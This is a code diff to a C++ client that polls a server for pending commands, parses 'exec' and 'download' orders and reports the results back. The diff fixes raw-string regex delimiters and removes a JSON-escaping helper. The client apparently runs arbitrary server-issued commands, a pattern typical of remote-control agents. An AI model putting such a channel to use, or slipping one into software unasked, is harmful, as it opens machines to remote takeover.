@@ -9,6 +9,7 @@
 #include <cstdio>
 #include <fstream>
 #include <sstream>
+#include <iomanip>
 #include <utility>
 
 std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
@@ -16,7 +17,7 @@ std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
     std::string endpoint = "/api/clients/" + cfg.clientID + "/commands";
     std::string resp;
     if (!httpGet(cfg, endpoint, resp)) return cmds;
-    std::regex re(R"("id"\s*:\s*"([^"]+)"[^}]*"type"\s*:\s*"([^"]+)")");
+    std::regex re(R"delim("id"\s*:\s*"([^"]+)"[^}]*"type"\s*:\s*"([^"]+)")delim");
     auto begin = std::sregex_iterator(resp.begin(), resp.end(), re);
     auto end = std::sregex_iterator();
     for (auto i = begin; i != end; ++i) {
@@ -27,14 +28,14 @@ std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
         ci.command = "";
         ci.path = "";
         if (ci.type == "exec") {
-            std::regex cmdRe(R"("command"\s*:\s*"([^"]*)")");
+            std::regex cmdRe(R"delim("command"\s*:\s*"([^"]*)")delim");
             std::smatch cmdM;
             std::string remaining = resp.substr(m.position());
             if (std::regex_search(remaining, cmdM, cmdRe)) {
                 ci.command = cmdM[1];
             }
         } else if (ci.type == "download") {
-            std::regex pathRe(R"("path"\s*:\s*"([^"]*)")");
+            std::regex pathRe(R"delim("path"\s*:\s*"([^"]*)")delim");
             std::smatch pathM;
             std::string remaining = resp.substr(m.position());
             if (std::regex_search(remaining, pathM, pathRe)) {
@@ -138,20 +139,4 @@ void processCommands(const Config& cfg) {
         }
         sendCommandResult(cfg, cmd.id, result, error, cmd.type == "download");
     }
-}
-
-std::string escapeJson(const std::string& s) {
-    std::ostringstream o; for (auto c: s) {
-        switch (c) {
-            case '\\': o << "\\\\"; break;
-            case '"': o << "\\\""; break;
-            case '\n': o << "\\n"; break;
-            case '\r': o << "\\r"; break;
-            case '\t': o << "\\t"; break;
-            default:
-                if (static_cast<unsigned char>(c) < 0x20) {
-                    o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
-                } else o << c;
-        }
-    } return o.str();
 }
